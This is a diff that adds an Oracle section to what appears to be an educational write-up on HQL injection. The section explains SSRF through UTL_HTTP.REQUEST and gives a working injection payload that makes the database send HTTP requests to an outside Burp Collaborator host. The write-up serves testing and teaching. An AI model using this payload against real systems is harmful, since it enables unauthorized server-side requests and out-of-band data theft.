@@ -559,5 +559,19 @@ Note the docs has the following to say about this function:
 
 This worked for me as I connected to the database as the `hqli` user and the backend processes were also running as `hqli`.
 
+## Oracle
+
+### SSRF via UTL_HTTP.REQUEST
+
+This was another case where the right conditions need to be in place in order for an attacker to exploit the vulnerability. By default the Oracle docker container did not have the correct ACL's to allow outbound HTTP requests. For demonstration purposes I've obviously configured that.
+
+With that in mind a payload such as the following can make outbound HTTP requests to an attacker controlled server:
+
+`0' or (function('LENGTH',function('UTL_HTTP.REQUEST','http://onfdv7d614cf08kpkqhcvxgxgomga6yv.oastify.com:80/'))>0) or '1'='2`
+
+Hits in Burp Collaborator:
+
+![](./images/oracle-ssrf.png)
+
 ---
 **Disclaimer:** This project is for educational and testing purposes only. Do not use on systems without proper authorization.
